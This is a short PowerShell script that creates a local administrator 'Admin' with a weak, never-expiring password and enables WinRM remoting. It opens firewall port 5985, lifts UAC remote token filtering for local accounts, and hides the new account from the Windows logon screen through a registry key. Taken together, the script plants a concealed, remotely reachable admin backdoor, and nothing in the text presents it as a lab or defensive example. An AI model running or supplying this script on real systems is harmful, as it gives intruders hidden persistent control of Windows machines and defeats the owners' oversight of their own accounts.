$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

Add-LocalGroupMember -Group "Administrators" -Member $Username

Enable-PSRemoting -Force

New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force

Exit
